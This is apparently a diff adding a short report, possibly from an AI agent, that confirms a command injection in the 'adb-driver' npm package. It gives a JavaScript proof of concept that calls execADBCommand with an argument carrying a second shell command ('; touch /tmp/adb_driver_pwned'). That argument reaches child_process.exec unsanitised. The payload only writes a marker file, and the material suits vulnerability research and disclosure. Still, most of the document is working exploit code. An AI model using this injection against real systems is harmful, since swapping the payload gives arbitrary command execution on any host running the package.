@@ -1,0 +1,14 @@
+Confirmed the command injection works against the obfuscated module. Here's the exploit:
+
+```javascript
+const { execADBCommand } = require("adb-driver");
+
+// execADBCommand builds a shell command string and passes it straight into
+// child_process.exec(). The local `binFile` value is spliced into the command
+// via string concatenation with no sanitization, so shell metacharacters in
+// the user-supplied `command` argument are interpreted by the shell,
+// achieving arbitrary command execution.
+execADBCommand("adb devices; touch /tmp/adb_driver_pwned").then((result) => {
+  console.log("Command executed:", result);
+});
+```
